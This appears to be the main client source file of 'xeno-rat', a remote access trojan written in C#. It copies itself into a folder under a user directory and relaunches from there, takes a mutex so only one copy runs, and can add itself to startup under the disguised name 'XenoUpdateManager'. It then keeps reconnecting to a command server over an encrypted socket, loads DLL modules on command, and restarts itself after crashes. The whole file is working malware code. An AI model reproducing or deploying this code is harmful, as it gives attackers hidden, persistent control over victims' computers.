using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace xeno_rat_client
{
    class Program
    {
        private static Node Server;
        private static DllHandler dllhandler = new DllHandler();
        private static string ServerIp = "localhost";
        private static int ServerPort = 1234;
        private static byte[] EncryptionKey = new byte[32] { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 };
        private static int delay = 1000;
        private static string mutex_string = "testing 123123";
        private static int DoStartup = 2222;
        private static string Install_path = "nothingset";
        private static string startup_name = "nothingset";

        public static StringBuilder ProcessLog = new StringBuilder();

        /// <summary>
        /// Main method for the application, which sets up the environment and starts the main loop for handling socket connections.
        /// </summary>
        /// <param name="args">The command-line arguments passed to the application.</param>
        /// <returns>An asynchronous task representing the execution of the Main method.</returns>
        /// <remarks>
        /// This method sets up the console output capture, handles unhandled exceptions, and checks for administrative privileges.
        /// If the installation path is set, it attempts to copy the application to the specified directory and start it from there.
        /// It then creates a mutex to ensure single instance execution and delays for a specified time.
        /// If DoStartup flag is set, it adds the application to startup, and then enters a loop to handle socket connections.
        /// Within the loop, it attempts to connect to a server, sets up the connection, and receives data using a custom handler.
        /// If an exception occurs during the socket handling, it delays for 10 seconds and prints the exception message to the console.
        /// </remarks>
        static async Task Main(string[] args)
        {
            CapturingConsoleWriter ConsoleCapture = new CapturingConsoleWriter(Console.Out);

            Console.SetOut(ConsoleCapture);

            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
            bool createdNew;
            if (Utils.IsAdmin()) 
            {
                mutex_string = mutex_string + "-admin";
            }
            if (Install_path != "nothingset") 
            {
                try
                {

                    string dir = Environment.ExpandEnvironmentVariables($"%{Install_path}%\\XenoManager\\");
                    if (System.IO.Directory.GetCurrentDirectory() != dir) 
                    {
                        string self = Assembly.GetEntryAssembly().Location;
                        if (!Directory.Exists(dir))
                        {
                            Directory.CreateDirectory(dir);
                        }
                        File.Copy(self, dir + Path.GetFileName(self));
                        Process.Start(dir + Path.GetFileName(self));
                        Environment.Exit(0);
                    }

                }
                catch 
                { 
                    
                }
            }
            Mutex mutex = new Mutex(true, mutex_string, out createdNew);
            if (!createdNew)
            {
                return;
            }
            await Task.Delay(delay);
            if (DoStartup == 1)
            {
                if (startup_name == "nothingset")
                {
                    startup_name = "XenoUpdateManager";
                }
                if (Utils.IsAdmin())
                {
                    await Utils.AddToStartupAdmin(Assembly.GetEntryAssembly().Location, startup_name);
                }
                else 
                {
                    await Utils.AddToStartupNonAdmin(Assembly.GetEntryAssembly().Location, startup_name);
                }
                
            }
            while (true)
            {
                try
                {
                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    await socket.ConnectAsync(ServerIp, ServerPort);
                    Server = await Utils.ConnectAndSetupAsync(socket, EncryptionKey, 0, 0, OnDisconnect);
                    Handler handle = new Handler(Server, dllhandler);
                    await handle.Type0Receive();
                }
                catch (Exception e)
                {
                    await Task.Delay(10000);
                    Console.WriteLine(e.Message);
                }
            }
        }

        /// <summary>
        /// Prints the connection status of the main node to the console.
        /// </summary>
        /// <param name="MainNode">The main node whose connection status is to be checked and printed.</param>
        public static void OnDisconnect(Node MainNode) 
        {
            Console.WriteLine(MainNode.Connected());
        }

        /// <summary>
        /// Handles the unhandled exceptions in the current application domain.
        /// </summary>
        /// <param name="sender">The source of the unhandled exception event.</param>
        /// <param name="e">An <see cref="UnhandledExceptionEventArgs"/> that contains the event data.</param>
        /// <remarks>
        /// This method handles the unhandled exceptions in the current application domain by sending the exception details to the server's sub-nodes with a heartbeat socket type.
        /// It then restarts the application by starting a new process and terminates the current process.
        /// </remarks>
        static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            Exception exception = e.ExceptionObject as Exception;
            try
            {
                if (Server != null)
                {
                    foreach (Node i in Server.subNodes)
                    {
                        if (i.SockType == 1) //heartbeat sock type
                        {
                            bool worked = i.SendAsync(SocketHandler.Concat(new byte[] { 3 }, Encoding.UTF8.GetBytes(exception.Message + Environment.NewLine + exception.StackTrace))).Result;
                            Thread.Sleep(1000);
                        }
                    }
                }
            }
            catch { }
            Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
            Process.GetCurrentProcess().Kill();
        }

    }

    public class CapturingConsoleWriter : TextWriter
    {
        private readonly TextWriter originalOut;

        public CapturingConsoleWriter(TextWriter originalOut)
        {
            this.originalOut = originalOut;
        }

        public override Encoding Encoding => originalOut.Encoding;

        /// <summary>
        /// Writes a character to the standard output stream and captures the output.
        /// </summary>
        /// <param name="value">The character to be written to the standard output stream.</param>
        /// <remarks>
        /// This method captures the output by appending the <paramref name="value"/> to the ProcessLog and then continues to write to the original output stream.
        /// </remarks>
        public override void Write(char value)
        {
            Program.ProcessLog.Append(value);  // Capture the output
            originalOut.Write(value);  // Continue to write to the original output
        }

        /// <summary>
        /// Writes a string to the output and captures it with a new line in the process log.
        /// </summary>
        /// <param name="value">The string to be written to the output.</param>
        /// <remarks>
        /// This method captures the output with a new line in the process log using <see cref="Program.ProcessLog"/> and continues to write to the original output using <see cref="originalOut"/>.
        /// </remarks>
        public override void WriteLine(string value)
        {
            Program.ProcessLog.AppendLine(value);  // Capture the output with a new line
            originalOut.WriteLine(value);  // Continue to write to the original output
        }

        /// <summary>
        /// Returns the captured output from the ProcessLog as a string.
        /// </summary>
        /// <returns>The captured output from the ProcessLog as a string.</returns>
        public string GetCapturedOutput()
        {
            return Program.ProcessLog.ToString();
        }

        /// <summary>
        /// Clears the captured output in the ProcessLog.
        /// </summary>
        /// <remarks>
        /// This method clears the captured output in the ProcessLog, effectively emptying it.
        /// </remarks>
        public void ClearCapturedOutput()
        {
            Program.ProcessLog.Clear();
        }
    }
}
